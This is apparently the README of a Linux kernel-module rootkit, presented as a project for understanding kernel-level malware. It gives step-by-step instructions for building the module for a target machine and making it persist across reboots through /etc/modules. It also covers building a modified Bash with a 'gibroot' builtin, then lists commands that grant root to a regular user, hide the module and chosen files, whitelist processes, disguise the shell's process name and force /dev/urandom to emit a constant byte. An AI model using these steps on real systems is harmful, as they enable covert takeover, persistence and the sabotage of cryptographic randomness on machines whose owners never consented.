
# linux rootkit

this is a kernel module-based rootkit for linux that supports privelige escalation, compromising random number generation, file and directory hiding, and process injection.

this is a project to allow participants to better understand the inner workings of malware at the kernel level and to gain a deeper understanding of the constraints and possibilities of actions in the kernel space.


## Building and Installation

step 1: open up the Makefile and set KDIR to the path of the linux source tree. this should be configured identically to the target machine's kernel, and it must be configured with support for kprobes and ftrace(these are technically not necessary for privelige escalation or toggling the module's visibility, but we haven't incorporated a compile option for only those features yet).

```
KDIR = ~/learning/linux #replace with appropriate path
```
step 2: run the Makefile to compile the kernel module, and copy rootkit_module.ko over to the target machine
```
Make
```

step 3: copy over bash-4.3 and bdoor_common.h to the target machine, and compile Bash by running configure --with-bash-malloc=no and make (to have this work with different versions of Bash, go int bash-4.3/builtins, copy over gibroot.def to the other version's builtin folder, and change its Makefile.in to conform with https://stackoverflow.com/questions/10063417/how-do-i-add-an-internal-command-to-bash)
```
cd bash-4.3
./configure --with-bash-malloc=no
make
```

(extra) step 4: to make the rootkit persistant,  while root in the target machine, move rootkit_module.ko into the folder specified by /lib/modules/$(uname -r)/, and add the line "rootkit_module" to the bottom of /etc/modules. this make kmod load the module upon boot.
```
cp rootkit.ko /lib/modules/$(uname -r)/
echo "rootkit" >> /etc/modules
```


## Run
to load the module, while root run
```
insmod rootkit.ko
```
the module can also be removed with
```
rmmod rootkit.ko
```

now, as a regular user run the compiled bash executable. this will grant you access to the new gibroot builtin
```
cd bash-4.3
./bash
```

## Command Reference

to escalate shell privelige to root, use
```
gibroot root
```

to restore original shell priveliges, use

```
gibroot unroot
```

to hide the kernel module from userspace, use
```
gibroot hmod
```

to restore the kernel module's visibility, use
```
gibroot smod
```

to hide a file(s) or directory(s), use
```
gibroot hide [file(s)]
```

to unhide files, use
```
gibroot show [file(s)]
```

to look at what files are being hidden, use
```
cat /proc/hidden_files
```

to compromise /dev/urandom so it always writes 0x20, use
```
gibroot urand
```

to whitelist processes and users from file hiding, use
```
gibroot wadd [TYPE] [NAME/ID]
```
supported types are PROCNAME,PID,UID,GID

to remove an entry from the whitelist, use
```
gibroot wrem [TYPE] [NAME/ID]
```

to view the entries in the whitelist, use
```
cat /proc/whitelist
```

to change the name of your bash process to something else, use
```
gibroot newname [NAME]
```
names of up to 16 characters are allowed (max length of comm field in a task struct)